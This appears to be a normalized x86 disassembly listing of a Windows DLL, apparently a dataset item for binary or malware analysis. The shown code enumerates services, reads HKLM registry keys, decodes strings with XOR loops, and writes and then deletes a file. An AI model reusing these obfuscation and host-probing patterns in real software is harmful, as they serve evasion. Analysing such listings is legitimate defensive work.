jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x68 ]
push ecx
push eax
call [ StrStrIW@IAT ]
test eax eax
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x38 ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push 0x0
push 0x1
push r--data
push 0x0
lea eax [ ebp - 0x1d4 ]
push eax
call edi
test eax eax
jne r-xdata
lea edx [ ebp - 0x48 ]
push edx
push eax
call [ StrStrIW@IAT ]
test eax eax
je r-xdata
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
lea edx [ ebp - 0x90 ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
mov ecx [ ebp - 0x1d4 ]
push 0x0
push ecx
call [ CryptReleaseContext@IAT ]
call ebx
cmp eax 0x80090016
jne r-xdata
sub_100033a0
push ebp
mov ebp esp
mov ecx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ecx + 0xc ]
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x8 ]
mov eax [ eax + esi * 4 ]
test eax eax
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
je r-xdata
pop esi
pop ebp
retn 0x4
call sub_1005b9b6
cmp esi [ eax + 0xc ]
jae r-xdata
xor eax eax
mov ecx [ eax + 0x8 ]
mov eax [ ecx + esi * 4 ]
pop esi
pop ebp
retn 0x4
sub_100033e0
mov eax [ edi ]
push 0xffffffff
lea ecx [ esi + 0x4 ]
mov [ esi ] eax
push 0x0
lea edx [ edi + 0x4 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push edx
mov [ ecx ] 0x0
call sub_100146b0
mov eax [ edi + 0x20 ]
mov [ esi + 0x20 ] eax
mov ecx [ edi + 0x24 ]
mov [ esi + 0x24 ] ecx
mov edx [ edi + 0x28 ]
mov [ esi + 0x28 ] edx
mov eax [ edi + 0x2c ]
mov [ esi + 0x2c ] eax
mov ecx [ edi + 0x30 ]
mov [ esi + 0x30 ] ecx
mov edx [ edi + 0x34 ]
mov [ esi + 0x34 ] edx
mov al [ edi + 0x38 ]
mov [ esi + 0x38 ] al
mov eax esi
retn
sub_10003440
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
push edi
mov edi [ ebp + 0x10 ]
lea ecx [ eax + edi ]
cmp ecx [ esi + 0x8 ]
ja r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp [ ebp + 0x14 ] 0x0
push edi
je r-xdata
mov ecx [ ebp + 0xc ]
push ecx
push eax
call sub_1001e162
mov edx [ ebp + 0xc ]
push edx
push eax
call sub_1003ed16
jmp r-xdata
push ebx
mov ebx 0x1
test edi edi
je r-xdata
add esp 0xc
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop edi
pop esi
pop ebp
retn
mov [ ebp + 0x8 ] edi
nop
sub [ ebp + 0x8 ] ebx
jne r-xdata
mov eax [ esi + 0x10 ]
add [ esi ] eax
add [ esi + 0x1c ] eax
mov edi [ esi ]
cmp ecx 0xa
jne r-xdata
mov ecx [ esi + 0xc ]
cmp ecx 0xffffffff
je r-xdata
cmp ecx 0x9
jne r-xdata
add [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
jmp r-xdata
add [ esi + 0x18 ] ebx
mov edx [ esi + 0x2c ]
mov eax [ edx ]
mov ecx [ eax + 0xc ]
mov eax [ esi + 0x18 ]
xor edx edx
div ecx
add eax ebx
imul eax ecx
mov [ esi + 0x18 ] eax
jmp r-xdata
cmp edi [ esi + 0x8 ]
jae r-xdata
mov [ esi + 0xc ] 0xffffffff
call sub_100776f0
jmp r-xdata
sub_100034f5
push 0x10
push r--data
call sub_10078b50
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_1003938d
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10003588
mov eax [ ebp - 0x1c ]
call sub_10078b95
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_10050b70
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_10020a90
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_100035a0
push ebp
mov ebp esp
push ecx
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn 0x10
mov eax [ eax + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
push eax
mov eax [ ecx + 0xf0 ]
call eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x28 ]
call eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x2c ]
call eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x30 ]
call eax
sub_10003602
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10042442
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_1000363b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov bl [ edi ]
cmp bl 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x3649
mov [ ecx + 0x2 ] 0x34
add ecx 0x3
mov [ ecx ] bl
inc ecx
jmp r-xdata
cmp esi 0x800
je r-xdata
mov dl 0x6f
jmp r-xdata
mov esi edx
and esi 0xe00
cmp esi 0x400
jne r-xdata
shl dl 0x3
not dl
and dl 0x20
or dl 0x58
mov dl [ edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_100036b3
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_1001742d
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_10012991
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_10012991
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_1000438e
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_10055977
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_1005c70c
pop ecx
test eax eax
jne r-xdata
call sub_1000438e
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_10055977
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_1000e7a4
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_1000b8bc
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_10003820
push ebp
mov ebp esp
push 0xffffffff
push sub_10080212
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ edi + 0x4 ]
mov esi [ ebp + 0x8 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10020490
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0xffffffff
push edx
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10020490
push 0xffffffff
push edx
push eax
jmp r-xdata
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] edx
mov [ ecx ] dl
call sub_100146b0
sub_100038f0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jne r-xdata
movsx edx [ ecx ]
rol eax 0x8
add eax edx
inc ecx
pop ebp
retn 0x8
sub_10003910
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10009180
mov eax [ fs : 0x0 ]
push eax
sub esp 0xabc
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi edx
mov [ ebp - 0xab0 ] edi
xor ebx ebx
mov [ ebp - 0xac0 ] ebx
mov [ ebp - 0xaac ] ebx
mov [ ebp - 0xabc ] ebx
mov [ ebp - 0xacc ] ebx
mov [ ebp - 0xab4 ] ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp edi ebx
je r-xdata
cmp [ ebp + 0x8 ] ebx
je r-xdata
lea edx [ ebp - 0xab8 ]
lea eax [ ebx + 0x2 ]
call sub_10050980
lea edx [ ebp - 0xaa4 ]
lea eax [ ebx + 0x1 ]
call sub_10050980
lea edx [ ebp - 0xaa8 ]
lea eax [ ebx + 0x3 ]
call sub_10050980
mov eax edx
push eax
push esi
call [ StrStrW@IAT ]
mov edx 0x30c
lea ecx [ ebp - 0x690 ]
test eax eax
mov eax ecx
je r-xdata
sub esi ecx
xor edi edi
lea ebx [ ebp - 0xaa4 ]
sub ebx ecx
lea esp [ esp ]
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0xaa8 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x690 ]
call sub_10030af0
test eax eax
jne r-xdata
jmp r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x690 ]
call sub_10030af0
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0xaa8 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0xaa4 ]
push eax
call sub_10030af0
test eax eax
je r-xdata
push edi
mov esi 0x30c
lea ebx [ ebp - 0x690 ]
call sub_10030af0
test eax eax
jne r-xdata
lea edx [ ebp - 0xaa4 ]
push edx
call sub_10030af0
test eax eax
jne r-xdata
mov edi [ ebp - 0xab0 ]
lea eax [ ebp - 0xaa8 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0xab8 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x690 ]
call sub_10030af0
test eax eax
jne r-xdata
lea ecx [ ebp - 0xaa4 ]
push ecx
call sub_10030af0
test eax eax
jne r-xdata
lea eax [ ebp - 0xaa8 ]
push eax
call sub_10030af0
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10030af0
test eax eax
jne r-xdata
call [ GetProcessHeap@IAT ]
mov ebx eax
mov [ ebp - 0xaa4 ] ebx
mov [ ebp - 0x4 ] 0x0
push 0x4
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov edi eax
mov [ ebp - 0xac0 ] edi
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10003d1e
mov eax [ ebp - 0xabc ]
jmp r-xdata
push 0x0
push 0x0
lea edx [ ebp - 0xac4 ]
push edx
lea eax [ ebp - 0xab4 ]
push eax
push 0x0
push 0x0
push 0x3
push 0x10
push 0x0
push edi
mov esi [ EnumServicesStatusExW@IAT ]
call esi
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xab4 ]
push ecx
push 0x8
push ebx
call [ HeapAlloc@IAT ]
mov [ ebp - 0xaac ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
push 0x0
push 0x0
lea edx [ ebp - 0xac4 ]
push edx
lea eax [ ebp - 0xacc ]
push eax
mov ecx [ ebp - 0xab4 ]
push ecx
mov edx [ ebp - 0xaac ]
push edx
push 0x3
push 0x10
push 0x0
push edi
call esi
test eax eax
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x4
call sub_10050980
lea edx [ ebp - 0x30 ]
xor eax eax
call sub_10050980
xor esi esi
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x898 ]
push ecx
mov ecx 0x104
call sub_10067840
imul esi esi 0x2c
mov edx [ ebp - 0xaac ]
mov eax [ esi + edx ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x898 ]
call sub_10030af0
lea ecx [ ebp - 0xab8 ]
push ecx
push 0x20119
push 0x0
mov edx ebx
push edx
push 0x80000002
mov esi [ RegOpenKeyExW@IAT ]
call esi
test eax eax
jne r-xdata
mov esi [ ebp - 0xac8 ]
inc esi
jmp r-xdata
lea eax [ ebp - 0xab8 ]
push eax
lea ecx [ ebp - 0x690 ]
push ecx
call sub_10028980
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0xac8 ] esi
cmp esi [ ebp - 0xac4 ]
jae r-xdata
lea edx [ ebp - 0xab0 ]
push edx
push 0x20119
push 0x0
mov eax ebx
push eax
push 0x80000002
call esi
test eax eax
jne r-xdata
lea ecx [ ebp - 0xaa0 ]
push ecx
lea edx [ ebp - 0x30 ]
push edx
lea edi [ ebp - 0xab0 ]
mov eax 0x104
call sub_10027e90
add esp 0x8
test eax eax
jne r-xdata
lea eax [ ebp - 0xaa0 ]
push eax
call [ PathFileExistsW@IAT ]
mov [ ebp - 0xabc ] eax
test eax eax
jne r-xdata
sub_10003d1e
mov eax [ ebp - 0xac0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xaac ]
test eax eax
je r-xdata
push eax
call [ CloseServiceHandle@IAT ]
retn
push eax
push 0x0
mov ecx [ ebp - 0xaa4 ]
push ecx
call [ HeapFree@IAT ]
sub_10003d4a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_10012991
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_1002788e
mov eax esi
sub_10003db0
push ebp
mov ebp esp
push 0xffffffff
push sub_100820ad
mov eax [ fs : 0x0 ]
push eax
sub esp 0x398
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x384 ] eax
xor ebx ebx
mov [ ebp - 0x388 ] ebx
mov eax 0x1
mov [ ebp - 0x38c ] eax
mov [ ebp - 0x394 ] eax
xor eax eax
mov esi edx
movzx edx ax
mov eax edx
mov [ ebp - 0x3a0 ] ecx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x2ec ]
[ edi ]
push ebx
xor eax eax
push r--data
lea ecx [ ebp - 0x308 ]
mov [ ebp - 0x390 ] esi
mov [ ebp - 0x398 ] ebx
mov [ ebp - 0x37c ] ebx
mov [ ebp - 0x39c ] ebx
mov [ ebp - 0x2f4 ] 0x7
mov [ ebp - 0x2f8 ] ebx
mov [ ebp - 0x308 ] ax
call sub_1005e3c0
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0x40000000
push esi
mov [ ebp - 0x4 ] ebx
call [ CreateFileW@IAT ]
mov [ ebp - 0x388 ] eax
cmp eax ebx
jne r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
push ebx
push 0x1
push 0x1
lea esi [ ebp - 0x35c ]
call sub_1003d580
add esp 0xc
push eax
lea ecx [ ebp - 0x308 ]
mov [ ebp - 0x4 ] 0x1
call sub_10051390
mov edi 0x8
mov [ ebp - 0x4 ] bl
cmp [ ebp - 0x348 ] edi
jb r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0x64
inc cl
mov [ ebp + eax - 0x380 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x37e ] bl
xor eax eax
lea esp [ esp ]
mov esi [ ebp - 0x384 ]
lea eax [ ebp - 0x308 ]
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] dx
call sub_10051390
cmp [ ebp - 0x2f4 ] edi
jmp r-xdata
mov ecx [ ebp - 0x35c ]
push ecx
call sub_10065045
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0xf5
inc cl
mov [ ebp + eax - 0xe4 ] dl
movzx eax cl
cmp eax 0x6f
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x75 ] bl
xor eax eax
jb r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0x83
inc cl
mov [ ebp + eax - 0x5c ] dl
movzx eax cl
cmp eax 0x19
jb r-xdata
mov edi 0xf
lea eax [ ebp - 0x380 ]
mov [ ebp - 0x43 ] bl
mov [ ebp - 0x32c ] edi
mov [ ebp - 0x330 ] ebx
mov [ ebp - 0x340 ] bl
lea edx [ eax + 0x1 ]
nop
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x308 ]
push ecx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x380 ]
push eax
lea ecx [ ebp - 0x340 ]
call sub_1005d090
lea ecx [ ebp - 0x340 ]
push ecx
lea edx [ ebp - 0xe4 ]
push edx
lea eax [ ebp - 0x35c ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10025a80
add esp 0xc
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0x3
call sub_1002a6e0
add esp 0x4
mov esi 0x10
cmp [ ebp - 0x348 ] esi
jb r-xdata
mov [ ebp - 0x348 ] edi
mov [ ebp - 0x34c ] ebx
mov [ ebp - 0x35c ] bl
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x32c ] esi
jb r-xdata
mov ecx [ ebp - 0x35c ]
push ecx
call sub_10065045
add esp 0x4
mov esi [ ebp - 0x310 ]
mov [ ebp - 0x32c ] edi
mov edi [ ebp - 0x324 ]
mov [ ebp - 0x330 ] ebx
mov [ ebp - 0x340 ] bl
mov eax edi
cmp esi 0x10
jae r-xdata
mov edx [ ebp - 0x340 ]
push edx
call sub_10065045
add esp 0x4
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
lea eax [ ebp - 0x324 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov ecx edi
cmp esi 0x10
jae r-xdata
mov esi [ ebp - 0x388 ]
push ebx
lea edx [ ebp - 0x3a4 ]
push edx
push eax
push ecx
push esi
call [ WriteFile@IAT ]
push esi
test eax eax
jne r-xdata
lea ecx [ ebp - 0x324 ]
call [ CloseHandle@IAT ]
lea esi [ ebp - 0x39c ]
lea ebx [ ebp - 0x37c ]
mov edx 0x80000001
call sub_1001d1d0
test eax eax
jne r-xdata
call [ CloseHandle@IAT ]
push ebx
push 0x1
push 0x1
lea esi [ ebp - 0x378 ]
call sub_1003d580
add esp 0xc
push eax
lea ecx [ ebp - 0x308 ]
mov [ ebp - 0x4 ] 0x7
call sub_10051390
mov edi 0x8
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x364 ] edi
jb r-xdata
lea esi [ ebp - 0x39c ]
lea ebx [ ebp - 0x37c ]
mov edx 0x80000002
call sub_1001d1d0
test eax eax
jne r-xdata
mov ebx [ ebp - 0x37c ]
mov eax ebx
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov esi [ ebp - 0x384 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
lea edx [ ebp - 0x308 ]
mov [ esi ] cx
push edx
mov ecx esi
call sub_10051390
cmp [ ebp - 0x310 ] 0x10
jb r-xdata
mov eax [ ebp - 0x378 ]
push eax
call sub_10065045
add esp 0x4
lea edx [ ebp - 0x370 ]
mov eax 0xf1
call sub_1001bb80
mov eax edx
xor ebx ebx
mov ebx [ ebp - 0x37c ]
mov eax ebx
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
lea edx [ eax + eax ]
push edx
lea eax [ ebp - 0x2ec ]
push ebx
push eax
call sub_10078600
add esp 0xc
push ebx
call [ CharUpperW@IAT ]
jmp r-xdata
cmp [ ebp - 0x2f4 ] edi
mov [ ebp - 0x314 ] ebx
mov [ ebp - 0x324 ] bl
jmp r-xdata
mov eax [ ebp - 0x324 ]
push eax
call sub_10065045
add esp 0x4
test ebx ebx
je r-xdata
mov edx [ ebp - 0x398 ]
mov eax [ ebp - 0x38c ]
mov ecx [ ebp - 0x394 ]
push edx
push eax
push ecx
lea esi [ ebp - 0x378 ]
call sub_1003d580
add esp 0xc
push eax
lea ecx [ ebp - 0x308 ]
mov [ ebp - 0x4 ] 0x8
call sub_10051390
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x364 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
lea ecx [ eax + eax ]
push ecx
lea edx [ ebp - 0x2ec ]
push ebx
push edx
call sub_10078600
add esp 0xc
push ebx
call [ CharUpperW@IAT ]
jmp r-xdata
mov [ ebp - 0x37c ] eax
lea edx [ ebp - 0x70 ]
mov eax 0xf1
call sub_1001bb80
lea edx [ ebp - 0x30 ]
mov eax 0x135
call sub_1001bb80
lea edx [ ebp - 0x20 ]
mov eax 0xb2
call sub_1001bb80
lea edx [ ebp - 0x40 ]
mov eax 0x104
call sub_1001bb80
mov ecx edx
push ecx
lea edx [ ebp - 0x20 ]
push edx
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x70 ]
push ecx
lea edx [ ebp - 0x308 ]
push edx
lea eax [ ebp - 0x2ec ]
push eax
lea ecx [ ebp - 0x37c ]
push ecx
lea edx [ ebp - 0x398 ]
push edx
lea eax [ ebp - 0x394 ]
push eax
lea ecx [ ebp - 0x3a0 ]
push ecx
lea edx [ ebp - 0x38c ]
lea ecx [ ebp - 0x390 ]
call sub_10055fd0
mov eax [ ebp - 0x2f8 ]
add esp 0x28
push r--data
xor edi edi
lea ecx [ ebp - 0x308 ]
call sub_1005e510
test eax eax
jne r-xdata
mov [ ebp - 0x310 ] 0xf
mov eax [ ebp - 0x390 ]
push eax
call [ DeleteFileW@IAT ]
mov esi [ ebp - 0x384 ]
xor ecx ecx
xor edi edi
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
lea edx [ ebp - 0x308 ]
mov [ esi ] cx
push edx
mov ecx esi
call sub_10051390
cmp [ ebp - 0x310 ] 0x10
jb r-xdata
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ebp - 0x378 ]
push edx
call sub_10065045
add esp 0x4
cmp [ ebp - 0x2f4 ] 0x8
mov [ ebp - 0x314 ] edi
mov [ ebp - 0x324 ] 0x0
mov eax [ ebp - 0x324 ]
push eax
call sub_10065045
add esp 0x4
sub_10004394
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
leave
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_1003fc32
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp + 0x20 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_1006a3e7
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_100783e0
add esp 0xc
test eax eax
je r-xdata
sub_10004425
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
xor ebx ebx
call sub_10054678
